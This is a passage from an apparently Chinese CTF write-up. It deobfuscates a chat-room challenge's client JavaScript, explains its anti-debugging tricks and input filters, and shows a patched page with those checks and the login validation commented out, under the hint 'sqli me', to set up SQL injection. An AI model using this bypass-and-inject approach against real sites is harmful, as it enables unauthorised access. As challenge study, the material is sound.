class="keyword">let</span> node = <span class="built_in">document</span>.createElement(<span class="string">&quot;li&quot;</span>);</span><br><span class="line">    node.innerHTML = <span class="string">&quot;&lt;h3&gt;&quot;</span> + err + <span class="string">&quot;&lt;/h3&gt;&lt;p&gt;&quot;</span> + isSlidingUp + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    hl.appendChild(node);</span><br><span class="line">  &#125;);</span><br><span class="line">  sock.on(<span class="string">&quot;msg_ret&quot;</span>, <span class="function">(<span class="params">err, theLibrary</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      alert(<span class="string">&quot;发送失败：&quot;</span> + theLibrary);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> node = <span class="built_in">document</span>.createElement(<span class="string">&quot;li&quot;</span>);</span><br><span class="line">      node.className = <span class="string">&quot;mine&quot;</span>;</span><br><span class="line">      node.innerHTML = <span class="string">&quot;&lt;h3&gt;&quot;</span> + fn + <span class="string">&quot;&lt;/h3&gt;&lt;p&gt;&quot;</span> + result[<span class="string">&quot;value&quot;</span>] + <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">      hl.appendChild(node);</span><br><span class="line">      result[<span class="string">&quot;value&quot;</span>] = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;, <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  _0x6c017f();</span><br><span class="line">&#125;, <span class="number">4E3</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_0x6c017f</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">next</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// if (typeof i === &quot;string&quot;) &#123;</span></span><br><span class="line">    <span class="comment">//   return function(err) &#123;</span></span><br><span class="line">    <span class="comment">//   &#125;.constructor(&quot;while (true) &#123;&#125;&quot;).apply(&quot;counter&quot;);</span></span><br><span class="line">    <span class="comment">// &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//   if (i % 20 === 0) &#123;</span></span><br><span class="line">    <span class="comment">//     (function() &#123;</span></span><br><span class="line">    <span class="comment">//       return true;</span></span><br><span class="line">    <span class="comment">//     &#125;).constructor(&quot;debugger&quot;).call(&quot;action&quot;);</span></span><br><span class="line">    <span class="comment">//   &#125; else &#123;</span></span><br><span class="line">    <span class="comment">//     (function() &#123;</span></span><br><span class="line">    <span class="comment">//       return false;</span></span><br><span class="line">    <span class="comment">//     &#125;).constructor(&quot;debugger&quot;).apply(&quot;stateObject&quot;);</span></span><br><span class="line">    <span class="comment">//   &#125;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    next(++i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (event) &#123;</span><br><span class="line">      <span class="keyword">return</span> next;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      next(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (_0xf40179) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>代码还是比较浅显易懂的，分为几部分：第一部分是反调试，他用了几种常见的手法检测你是否开了F12，比如是devtools，还有浏览器窗口比例等等，采取的对应措施是直接回显<code>hacker</code>，以及在某一个断点无限debug，还有就是在浏览器load的时候直接500，导致的后果就是我火狐直接卡死，这些都是一些反调试手法。第二部分是对于username和passwd的一个过滤，只允许有数字和正常字符。第三部分就是和后端走的<code>sock.io</code>的通讯，我们之后再说。</p>
+<p>代码看起来美观，但好像执行不了，这题的patch我们只需要把一些关键部分注释了即可，所以我又回去改原来的代码了：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>聊天室<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;//cdn.bootcss.com/socket.io/2.1.1/socket.io.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;protobuf.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.mine</span>&#123;</span></span><br><span class="line"><span class="css">            <span class="attribute">color</span>:green;</span></span><br><span class="line"><span class="css">        &#125;</span></span><br><span class="line"><span class="css">        <span class="selector-tag">Body</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">bg.webp</span>);</span></span><br><span class="line"><span class="css">   <span class="attribute">background-repeat</span>:no-repeat;</span></span><br><span class="line"><span class="css">   <span class="attribute">background-size</span>:<span class="number">100%</span>;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css">    </span></span><br><span class="line"><span class="css"><span class="selector-tag">input</span> &#123;</span></span><br><span class="line"><span class="css">  <span class="attribute">background-color</span>: transparent;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css"><span class="selector-tag">textarea</span> &#123;</span></span><br><span class="line"><span class="css">  <span class="attribute">background-color</span>: transparent;</span></span><br><span class="line"><span class="css">&#125;</span></span><br><span class="line"><span class="css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;user&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">   密 码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;pass&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;注册&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn1&quot;</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn2&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;txt1&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;80&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;发送&quot;</span> <span class="attr">id</span>=<span class="string">&quot;btn_send&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;ul1&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--hint:sqli me--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> _0x476866 = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> _0x4bb9fc = !![];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">_0x58c9dc, _0x4b0a21</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> _0xf76523 = _0x4bb9fc ? <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (_0x4b0a21) &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">const</span> _0x635e3f = _0x4b0a21[<span class="string">&#x27;apply&#x27;</span>](_0x58c9dc, <span class="built_in">arguments</span>);</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">return</span> _0x4b0a21 = <span class="literal">null</span>, _0x635e3f;</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125; : <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            &#125;;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> _0x4bb9fc = ![], _0xf76523;</span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript">    &#125;();</span></span><br><span class="line"><span class="javascript">    (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        _0x476866(<span class="built_in">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> _0x22f222 = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;function\x20*\x5c(\x20*\x5c)&#x27;</span>), _0x28c056 = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;\x5c+\x5c+\x20*(?:[a-zA-Z_$][0-9a-zA-Z_$]*)&#x27;</span>, <span class="string">&#x27;i&#x27;</span>), _0x5d5775 = _0x6c017f(<span class="string">&#x27;init&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            !_0x22f222[<span class="string">&#x27;test&#x27;</span>](_0x5d5775 + <span class="string">&#x27;chain&#x27;</span>) || !_0x28c056[<span class="string">&#x27;test&#x27;</span>](_0x5d5775 + <span class="string">&#x27;input&#x27;</span>) ? _0x5d5775(<span class="string">&#x27;0&#x27;</span>) : _0x6c017f();</span></span><br><span class="line"><span class="javascript">        &#125;)();</span></span><br><span class="line"><span class="javascript">    &#125;());</span></span><br><span class="line"><span class="javascript">    <span class="string">&#x27;use strict&#x27;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">const</span> _0x2fe348 = &#123;</span></span><br><span class="line"><span class="javascript">            <span class="string">&#x27;isOpen&#x27;</span>: ![],</span></span><br><span class="line"><span class="javascript">            <span class="string">&#x27;orientation&#x27;</span>: <span class="literal">undefined</span></span></span><br><span class="line"><span class="javascript">        &#125;, _0x14edab = <span class="number">0xa0</span>, _0x3b75b5 = <span class="function">(<span class="params">_0x231b41, _0x547b1f</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>[<span class="string">&#x27;dispatchEvent&#x27;</span>](<span class="keyword">new</span> CustomEvent(<span class="string">&#x27;devtoolschange&#x27;</span>, &#123;</span></span><br><span class="line"><span class="javascript">                <span class="string">&#x27;detail&#x27;</span>: &#123;</span></span><br><span class="line"><span class="javascript">                    <span class="string">&#x27;isOpen&#x27;</span>: _0x231b41,</span></span><br><span class="line"><span class="javascript">                    <span class="string">&#x27;orientation&#x27;</span>: _0x547b1f</span></span><br><span class="line"><span class="javascript">                &#125;</span></span><br><span class="line"><span class="javascript">            &#125;));</span></span><br><span class="line"><span class="javascript">        &#125;, _0x572096 = <span class="function">(<span class="params">&#123;</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="javascript">            emitEvents: emitEvents = !![]</span></span></span></span><br><span class="line"><span class="params"><span class="function"><span class="javascript">        &#125; = &#123;&#125;</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> _0x112831 = <span class="built_in">window</span>[<span class="string">&#x27;outerWidth&#x27;</span>] - <span class="built_in">window</span>[<span class="string">&#x27;innerWidth&#x27;</span>] &gt; _0x14edab, _0x4ca755 = <span class="built_in">window</span>[<span class="string">&#x27;outerHeight&#x27;</span>] - <span class="built_in">window</span>[<span class="string">&#x27;innerHeight&#x27;</span>] &gt; _0x14edab, _0x80c7cf = _0x112831 ? <span class="string">&#x27;vertical&#x27;</span> : <span class="string">&#x27;horizontal&#x27;</span>;</span></span><br><span class="line"><span class="javascript">            !(_0x4ca755 &amp;&amp; _0x112831) &amp;&amp; (<span class="built_in">window</span>[<span class="string">&#x27;Firebug&#x27;</span>] &amp;&amp; <span class="built_in">window</span>[<span class="string">&#x27;Firebug&#x27;</span>][<span class="string">&#x27;chrome&#x27;</span>] &amp;&amp; <span class="built_in">window</span>[<span class="string">&#x27;Firebug&#x27;</span>][<span class="string">&#x27;chrome&#x27;</span>][<span class="string">&#x27;isInitialized&#x27;</span>] || _0x112831 || _0x4ca755) ? ((!_0x2fe348[<span class="string">&#x27;isOpen&#x27;</span>] || _0x2fe348[<span class="string">&#x27;orientation&#x27;</span>] !== _0x80c7cf) &amp;&amp; emitEvents &amp;&amp; _0x3b75b5(!![], _0x80c7cf), _0x2fe348[<span class="string">&#x27;isOpen&#x27;</span>] = !![], _0x2fe348[<span class="string">&#x27;orientation&#x27;</span>] = _0x80c7cf) : (_0x2fe348[<span class="string">&#x27;isOpen&#x27;</span>] &amp;&amp; emitEvents &amp;&amp; _0x3b75b5(![], <span class="literal">undefined</span>), _0x2fe348[<span class="string">&#x27;isOpen&#x27;</span>] = ![], _0x2fe348[<span class="string">&#x27;orientation&#x27;</span>] = <span class="literal">undefined</span>);</span></span><br><span class="line"><span class="javascript">        &#125;;</span></span><br><span class="line"><span class="javascript">    _0x572096(&#123; <span class="string">&#x27;emitEvents&#x27;</span>: ![] &#125;), <span class="comment">/*setInterval(_0x572096, 0x1f4),*/</span> <span class="keyword">typeof</span> <span class="built_in">module</span> !== <span class="string">&#x27;undefined&#x27;</span> &amp;&amp; <span class="built_in">module</span>[<span class="string">&#x27;exports&#x27;</span>] ? <span class="built_in">module</span>[<span class="string">&#x27;exports&#x27;</span>] = _0x2fe348 : <span class="built_in">window</span>[<span class="string">&#x27;devtools&#x27;</span>] = _0x2fe348;</span></span><br><span class="line"><span class="javascript">&#125;());</span></span><br><span class="line"><span class="javascript"><span class="comment">// window[&#x27;devtools&#x27;][&#x27;isOpen&#x27;] === !![] &amp;&amp; (document[&#x27;documentElement&#x27;][&#x27;innerHTML&#x27;] = &#x27;Hacker!&lt;br&gt;&#x27;);</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// window[&#x27;addEventListener&#x27;](&#x27;devtoolschange&#x27;, _0x54eab0 =&gt; &#123;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//     document[&#x27;documentElement&#x27;][&#x27;innerHTML&#x27;] = &#x27;Hacker!&lt;br&gt;&#x27;;</span></span></span><br><span class="line"><span class="javascript"><span class="comment">// &#125;);</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">let</span> sock = io[<span class="string">&#x27;connect&#x27;</span>](<span class="string">&#x27;ws://&#x27;</span> + <span class="built_in">window</span>[<span class="string">&#x27;location&#x27;</span>][<span class="string">&#x27;host&#x27;</span>] + <span class="string">&#x27;/&#x27;</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> WSMessage, wsmessage, buffer;</span></span><br><span class="line"><span class="javascript">protobuf[<span class="string">&#x27;load&#x27;</span>](<span class="string">&#x27;chat.proto&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">_0x1e8bc6, _0x75e501</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (_0x1e8bc6)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">throw</span> _0x1e8bc6;</span></span><br><span class="line"><span class="javascript">    LoginReq = _0x75e501[<span class="string">&#x27;lookup&#x27;</span>](<span class="string">&#x27;wschat.chat.LoginReq&#x27;</span>), RegReq = _0x75e501[<span class="string">&#x27;lookup&#x27;</span>](<span class="string">&#x27;wschat.chat.RegReq&#x27;</span>), ServerRsp = _0x75e501[<span class="string">&#x27;lookup&#x27;</span>](<span class="string">&#x27;wschat.chat.ServerRsp&#x27;</span>), MsgReq = _0x75e501[<span class="string">&#x27;lookup&#x27;</span>](<span class="string">&#x27;wschat.chat.MsgReq&#x27;</span>), LogoutReq = _0x75e501[<span class="string">&#x27;lookup&#x27;</span>](<span class="string">&#x27;wschat.chat.LogoutReq&#x27;</span>);</span></span><br><span class="line"><span class="javascript">&#125;), <span class="built_in">window</span>[<span class="string">&#x27;onload&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> _0x1f4215 = <span class="string">&#x27;&#x27;</span>, _0x1139cf = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;btn1&#x27;</span>), _0x2af11b = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;btn2&#x27;</span>), _0x413d89 = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;btn_send&#x27;</span>), _0x29d952 = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;user&#x27;</span>), _0x22dda2 = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;pass&#x27;</span>), _0x2c48a5 = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;txt1&#x27;</span>), _0x5900fb = <span class="built_in">document</span>[<span class="string">&#x27;getElementById&#x27;</span>](<span class="string">&#x27;ul1&#x27;</span>);</span></span><br><span class="line"><span class="javascript">    _0x1139cf[<span class="string">&#x27;onclick&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> _0x3689c9 = RegReq[<span class="string">&#x27;create&#x27;</span>](&#123;</span></span><br><span class="line"><span class="javascript">                <span class="string">&#x27;username&#x27;</span>: _0x29d952[<span class="string">&#x27;value&#x27;</span>],</span></span><br><span class="line"><span class="javascript">                <span class="string">&#x27;password&#x27;</span>: _0x22dda2[<span class="string">&#x27;value&#x27;</span>]</span></span><br><span class="line"><span class="javascript">            &#125;), _0x38c60d = RegReq[<span class="string">&#x27;encode&#x27;</span>](_0x3689c9)[<span class="string">&#x27;finish&#x27;</span>]();</span></span><br><span class="line"><span class="javascript">        sock[<span class="string">&#x27;emit&#x27;</span>](<span class="string">&#x27;reg&#x27;</span>, _0x38c60d[<span class="string">&#x27;slice&#x27;</span>]()[<span class="string">&#x27;buffer&#x27;</span>]);</span></span><br><span class="line"><span class="javascript">    &#125;, sock[<span class="string">&#x27;on&#x27;</span>](<span class="string">&#x27;reg_ret&#x27;</span>, <span class="function">(<span class="params">_0x77442, _0x4d8078</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        _0x77442 ? alert(_0x4d8078) : alert(_0x4d8078);</span></span><br><span class="line"><span class="javascript">    &#125;), _0x2af11b[<span class="string">&#x27;onclick&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// if (!/^\w&#123;1,16&#125;$/[&#x27;test&#x27;](_0x29d952[&#x27;value&#x27;])) &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     alert(&#x27;用户名不符合规范&#x27;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     return;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// if (!/^\w&#123;1,16&#125;$/[&#x27;test&#x27;](_0x22dda2[&#x27;value&#x27;])) &#123;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     alert(&#x27;密码不符合规范&#x27;);</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">//     return;</span></span></span><br><span class="line"><span class="javascript">        <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> _0xea8ad4 = LoginReq[<span class="string">&#x27;create&#x27;</span>](&#123;</span></span><br><span class="line"><span class="javascript">                <span class="string">&#x27;username&#x27;</span>: _0x29d952[<span class="string">&#x27;value&#x27;</span>],</span></span><br><span class="line"><span class="javascript">                <span class="string">&#x27;password&#x27;</span>: _0x22dda2[<span class="string">&#x27;value&#x27;</span>]</span></span><br><span class="line"><span class="javascript">            &#125;), _0x581e63 = LoginReq[<span class="string">&#x27;encode&#x27;</span>](_0xea8ad4)[<span class="string">&#x27;finish&#x27;</span>]();</span></span><br><span class="line"><span class="javascript">        sock[<span class="string">&#x27;emit&#x27;</span>](<span class="string">&#x27;login&#x27;</span>, _0x581e63[<span class="string">&#x27;slice&#x27;</span>]()[<span class="string">&#x27;buffer&#x27;</span>]);</span></span><br><span class="line"><span class="javascript">    &#125;, sock[<span class="string">&#x27;on&#x27;</span>](<span class="string">&#x27;login_ret&#x27;</span>, <span class="function">(<span class="params">_0x253784, _0x4ca143</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        _0x253784 ? alert(_0x4ca143) : (_0x1f4215 = _0x29d952[<span class="string">&#x27;value&#x27;</span>], alert(_0x4ca143));alert(_0x4ca143.indexOf(<span class="string">&quot;成功&quot;</span>) != -<span class="number">1</span>);</span></span><br><span class="line"><span class="javascript">    &#125;), _0x413d89[<span class="string">&#x27;onclick&#x27;</span>] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> _0x254c70 = MsgReq[<span class="string">&#x27;create&#x27;</span>](&#123; <span class="string">&#x27;msg&#x27;</span>: _0x2c48a5[<span class="string">&#x27;value&#x27;</span>] &#125;), _0x56ebdb = MsgReq[<span class="string">&#x27;encode&#x27;</span>](_0x254c70)[<span class="string">&#x27;finish&#x27;</span>]();</span></span><br><span class="line"><span class="javascript">        sock[<span class="string">&#x27;emit&#x27;</span>](<span class="string">&#x27;msg&#x27;</span>, _0x56ebdb[<span class="string">&#x27;slice&#x27;</span>]()[<span class="string">&#x27;buffer&#x27;</span>]);</span></span><br><span class="line"><span class="javascript">    &#125;, sock[<span class="string">&#x27;on&#x27;</span>](<span class="string">&#x27;msg&#x27;</span>, <span class="function">(<span class="params">_0x2378cb, _0x4ce8f4</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">let</span> _0x3ca130 = <span class="built_in">document</span>[<span class="string">&#x27;createElement&#x27;</span>](<span class="string">&#x27;li&#x27;</span>);</span></span><br><span class="line"><span class="javascript">        _0x3ca130[<span class="string">&#x27;innerHTML&#x27;</span>] = <span class="string">&#x27;&lt;h3&gt;&#x27;</span> + _0x2378cb + <span class="string">&#x27;&lt;/h3&gt;&lt;p&gt;&#x27;</span> + _0x4ce8f4 + <span class="string">&#x27;&lt;/p&gt;&#x27;</span>, _0x5900fb[<span class="string">&#x27;appendChild&#x27;</span>](_0x3ca130);</span></span><br><span class="line"><span class="javascript">    &#125;), sock[<span class="string">&#x27;on&#x27;</span>](<span class="string">&#x27;msg_ret&#x27;</span>, <span class="function">(<span class="params">_0x491ba1, _0x25dec1</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (_0x491ba1)</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&#x27;发送失败：&#x27;</span> + _0x25dec1);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">let</span> _0x4a7033 = <span class="built_in">document</span>[<span class="string">&#x27;createElement&#x27;</span>](<span class="string">&#x27;li&#x27;</span>);</span></span><br><span class="line"><span class="javascript">            _0x4a7033[<span class="string">&#x27;className&#x27;</span>] = <span class="string">&#x27;mine&#x27;</span>, _0x4a7033[<span class="string">&#x27;innerHTML&#x27;</span>] = <span class="string">&#x27;&lt;h3&gt;&#x27;</span> + _0x1f4215 + <span class="string">&#x27;&lt;/h3&gt;&lt;p&gt;&#x27;</span> + _0x2c48a5[<span class="string">&#x27;value&#x27;</span>] + <span class="string">&#x27;&lt;/p&gt;&#x27;</span>, _0x5900fb[<span class="string">&#x27;appendChild&#x27;</span>](_0x4a7033), _0x2c48a5[<span class="string">&#x27;value&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;);</span></span><br><span class="line"><span class="javascript">&#125;, <span class="built_in">setInterval</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    _0x6c017f();</span></span><br><span class="line"><span 